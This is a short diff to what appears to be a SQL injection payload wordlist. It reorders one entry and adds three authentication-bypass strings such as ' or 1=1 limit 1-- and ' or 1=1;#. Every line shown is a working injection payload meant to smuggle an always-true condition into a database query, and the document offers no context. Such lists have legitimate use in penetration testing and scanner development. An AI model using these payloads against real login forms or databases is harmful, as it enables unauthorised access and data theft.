@@ -1,9 +1,9 @@
 ' or ''='
+" or ""="
 ' or true--
 ') or ('')=('
 ') or 1--
 " or true--
-" or ""="
 " or 1--
 ") or true--
 ") or ("")=("
@@ -14,3 +14,6 @@
 ')) or 1--
 ' or '1'='1
 ' or 1=1 --
+' or 1=1 limit 1--
+' or 1=1;#
+" or 1=1 limit 1;#
